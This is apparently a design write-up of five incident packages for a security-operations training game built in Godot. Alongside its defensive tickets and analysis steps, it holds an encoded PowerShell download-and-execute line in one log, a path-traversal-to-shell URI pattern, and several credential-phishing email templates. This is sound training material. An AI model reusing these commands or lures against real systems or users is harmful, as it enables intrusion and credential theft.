Here are 5 high-fidelity Incident Packages designed for direct implementation into your Godot 4.4 SOC Simulator.

These packages are structured to introduce complex decision-making (like the trade-off between quarantine and forensics) and align with the escalating tension of your "Week 3: Corporate Espionage" and "Week 4: Zero-Day Apocalypse" narrative arcs.

---

### Week 3: Corporate Espionage
*Theme: A shadowy competitor is using targeted, low-and-slow techniques to steal sensitive intellectual property.*

---

#### Incident Package #3-01: "The Silent Credential Harvest"
- **Concept:** A spear-phishing email with impeccable authentication tricks the victim into entering Office 365 credentials on a lookalike portal.

##### A. The Ticket (TicketResource)
- **Ticket ID:** ESP-023
- **Title:** Potential Credential Phishing targeting {victim}
- **Description:** User {victim} reported a password reset notification, despite not requesting one. An email was received from a domain impersonating our SSO provider. The user admits to clicking the link and attempting to log in.
- **Severity:** High
- **Category:** Phishing
- **Analysis Steps:**
    1.  Analyze Email Headers for domain impersonation techniques.
    2.  Correlate {victim}’s geolocation login attempts in Office365 logs.
    3.  Check for any suspicious mailbox forwarding rules created by {victim}.
- **Required Tool:** email
- **Required Log IDs:** LOG-O365-001, LOG-SYS-089

##### B. The Evidence Log (LogResource)
- **Log ID:** LOG-O365-001
- **Source:** Office365
- **Message:** Impossible travel detected for user {victim}. Successful login from legitimate IP (192.168.1.45) at 09:02:00 and simultaneous login from {ip} (Mountain View, CA) at 09:03:15.
- **Severity:** 4

- **Log ID:** LOG-SYS-089
- **Source:** SysMon
- **Message:** Process Creation (Rule: PowerShell). User: {victim}. CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AewBtAGEAbABpAGMAaQBvAHUAcwBfdXJsfQAnACkA
- **Severity:** 5

##### C. The Email (EmailResource)
- **Subject:** Action Required: Outstanding Password Reset Request
- **Body:** `Dear {victim}, Our automated system detected a failed login attempt on your account. To maintain compliance, you must verify your credentials immediately. <a href="http://{malicious_url}/sso-login">Click here to confirm</a>. Failure to do so will result in mailbox suspension.`
- **Headers:**
    - **SPF:** PASS
    - **DKIM:** PASS
    - **DMARC:** PASS (Compromised legitimate vendor account used to send this email)
- **Hidden Risk:** `compromised_vendor_account` (If the player quarantines the email but fails to check for the backdoor PowerShell beacon established via a second-stage payload, the attacker retains access).

---

#### Incident Package #3-02: "The Data Hoarder"
- **Concept:** An insider, possibly paid by a competitor, is manually exfiltrating design documents to a personal cloud storage account.

##### A. The Ticket (TicketResource)
- **Ticket ID:** DLP-045
- **Title:** Unusual Outbound Data Transfer from Engineering
- **Description:** DLP alert triggered by a workstation in the high-security engineering subnet. Over 5GB of proprietary design files were zipped and uploaded to an external cloud storage provider not sanctioned by IT.
- **Severity:** Critical
- **Category:** Insider Threat
- **Analysis Steps:**
    1.  Verify the source host and user identity against badge access logs.
    2.  Use the terminal to capture a memory snapshot of the process performing the upload.
    3.  Identify the destination IP and domain reputation.
- **Required Tool:** terminal
- **Required Log IDs:** LOG-FW-882, LOG-DLP-101

##### B. The Evidence Log (LogResource)
- **Log ID:** LOG-FW-882
- **Source:** Firewall (Next-Gen)
- **Message:** Connection Burst: {host} to {ip}:443 (Unknown Cloud Provider). 4.7GB Transferred. Application: Web Browsing (TLS). User: {victim}.
- **Severity:** 3

- **Log ID:** LOG-DLP-101
- **Source:** Endpoint DLP
- **Message:** Data Loss Prevention match: File `project_zeus_schematics_v3.zip` containing classification "PROPRIETARY & CONFIDENTIAL" uploaded to web drive {malicious_url}.
- **Severity:** 5

##### C. The Email (EmailResource)
- **Subject:** FW: Personal Cloud Storage Access
- **Body:** `{victim}, As per your request, access to personal cloud drives has been temporarily enabled for the next 2 hours for business continuity. Please ensure no PHI or PII is uploaded. – IT Support`
- **Headers:**
    - **SPF:** PASS
    - **DKIM:** FAIL (Spoofed internal IT department)
    - **DMARC:** FAIL
- **Hidden Risk:** `missed_lateral_movement` (If the player isolates the host immediately without scanning the process memory, they miss the fact that the user is currently on the phone with the attacker, feeding them the files manually).

---

### Week 4: Zero-Day Apocalypse
*Theme: A widespread, unknown vulnerability is being exploited in the wild, causing chaos across the infrastructure.*

---

#### Incident Package #4-01: "The Auth Bypass Ghost"
- **Concept:** Attackers are exploiting a zero-day in a widely used network device to bypass authentication and establish persistent C2 channels.

##### A. The Ticket (TicketResource)
- **Ticket ID:** ZERO-001
- **Title:** Critical Auth Bypass on Perimeter Edge Device
- **Description:** Emerging Threat Intel reports active exploitation of CVE-2024-ZZZZ affecting our VPN concentrator model. Anomalous traffic from {host} suggests a webshell has been uploaded.
- **Severity:** Critical
- **Category:** Unauthorized Access
- **Analysis Steps:**
    1.  Verify device integrity by checking for unauthorized configuration changes.
    2.  Use SIEM to find beaconing traffic from {host} to known C2 infrastructure.
    3.  Cross-reference access logs to see if legitimate credentials were used.
- **Required Tool:** siem
- **Required Log IDs:** LOG-IDS-404, LOG-CONF-999

##### B. The Evidence Log (LogResource)
- **Log ID:** LOG-IDS-404
- **Source:** IDS/IPS
- **Message:** SURICATA: ET WEB_SERVER Possible CVE-2024-ZZZZ Webshell Access on {host} - URI Pattern `/cgi-bin/.%2e/.%2e/.%2e/bin/sh` matched. Source: {ip}.
- **Severity:** 5

- **Log ID:** LOG-CONF-999
- **Source:** Configuration Management
- **Message:** Device Config Change: {host}. New SSH User "service-acct" added with UID 0 privileges. No change ticket associated. Time of change matches IDS alert.
- **Severity:** 5

##### C. The Email (EmailResource)
- **Subject:** URGENT PATCH: VPN Concentrator Maintenance
- **Body:** `Admins, A critical patch for your VPN device is available for immediate deployment. Download and apply using your admin credentials here: http://{malicious_url}/firmware-update Please complete within the hour to prevent a breach. – NOC Leadership`
- **Headers:**
    - **SPF:** PASS
    - **DKIM:** PASS
    - **DMARC:** PASS (Attacker compromised the NOC mailing list)
- **Hidden Risk:** `config_lockout` (If the player attempts to connect to the device using the terminal to "isolate" it, the attacker's modified config locks them out, triggering a full outage before they can stop the exfiltration).

---

#### Incident Package #4-02: "Process Ghosting Payload"
- **Concept:** A zero-day evasion technique (Process Ghosting) is used to deploy ransomware, bypassing traditional EDR.

##### A. The Ticket (TicketResource)
- **Ticket ID:** RANSOM-007
- **Title:** Rapid File Encryption Alerts on Marketing Share
- **Description:** Multiple users reporting files opening with a `.encrypted` extension. EDR shows a known good process (`svchost.exe`) with anomalous network behavior originating from {host}.
- **Severity:** Critical
- **Category:** Ransomware
- **Analysis Steps:**
    1.  Use terminal to identify the parent process of the malicious `svchost.exe`.
    2.  Isolate the host immediately to prevent encryption of network shares.
    3.  Analyze outbound connections to find the ransomware operator's C2.
- **Required Tool:** terminal
- **Required Log IDs:** LOG-SYS-666, LOG-PROC-777

##### B. The Evidence Log (LogResource)
- **Log ID:** LOG-SYS-666
- **Source:** SysMon (Process Access)
- **Message:** Process accessed handle to `lsass.exe` from `svchost.exe` (PID: 1337) with suspicious access rights (0x1410). Source Path: `C:\Windows\Temp\~tmpDF9.tmp`.
- **Severity:** 4

- **Log ID:** LOG-PROC-777
- **Source:** EDR
- **Message:** Process Ghosting technique detected. Process `svchost.exe` (PID: 1337) is running from a deleted image on disk. Network connections established to {ip}:8443.
- **Severity:** 5

##### C. The Email (EmailResource)
- **Subject:** Important: Updated Holiday Schedule
- **Body:** `Hi {victim}, Please review the updated holiday schedule for the Q3 closure. The document is password-protected for your safety. Password is "1234". Download here: [Link to {malicious_url}/schedule.doc]`
- **Headers:**
    - **SPF:** FAIL
    - **DKIM:** FAIL
    - **DMARC:** FAIL (Generic domain impersonation)
- **Hidden Risk:** `ransomware_spread` (If the player only scans the link and deletes the email, but doesn't isolate {host} in time, the ransomware continues to encrypt the network drives).

---

#### Incident Package #4-03: "The Dependency Confusion"
- **Concept:** A zero-day supply chain attack where a malicious package is uploaded to a public repository, and an internal build server pulls it instead of the private one.

##### A. The Ticket (TicketResource)
- **Ticket ID:** DEV-INF-88
- **Title:** Build Pipeline Compromise - Cryptominer Deployed
- **Description:** DevOps reports a sudden spike in CPU usage on build servers. A new process named "java.exe" is running from a temp directory. Review of logs shows a new package `internal-logger` was fetched from the public NPM registry, not our private one.
- **Severity:** High
- **Category:** Malware
- **Analysis Steps:**
    1.  Verify the hash of the downloaded package against the legitimate internal version.
    2.  Trace the outbound connections from the build server {host} to the miner's C2 pool.
    3.  Check the package registry for the domain of the malicious uploader.
- **Required Tool:** siem
- **Required Log IDs:** LOG-DEV-123, LOG-NPM-456

##### B. The Evidence Log (LogResource)
- **Log ID:** LOG-DEV-123
- **Source:** Build Server Logs
- **Message:** Build Job #1142 for project `authentication-api`. Dependency resolved: `internal-logger` version `2.1.1` fetched from `https://registry.npmjs.org/internal-logger`. Expected source: `http://internal-artifactory/repo`.
- **Severity:** 4

- **Log ID:** LOG-NPM-456
- **Source:** Firewall (DNS Query)
- **Message:** DNS Request from {host}: `update.nodejs.packages.top`. Resolves to {ip}. User-Agent: npm.
- **Severity:** 3

##### C. The Email (EmailResource)
- **Subject:** [GitHub] Security Alert for your dependencies
- **Body:** `Hello Developer, A vulnerability was found in one of your dependencies. Please merge this pull request to patch it immediately. <a href="http://{malicious_url}/fix-patch">Merge Request #42</a>.`
- **Headers:**
    - **SPF:** PASS
    - **DKIM:** PASS
    - **DMARC:** PASS (Attacker cloned the GitHub notification system and used a typosquatted domain)
- **Hidden Risk:** `supply_chain_propagation` (If the player simply kills the miner process on {host} but doesn't purge the malicious package from the artifact repository, the next build will be instantly re-infected).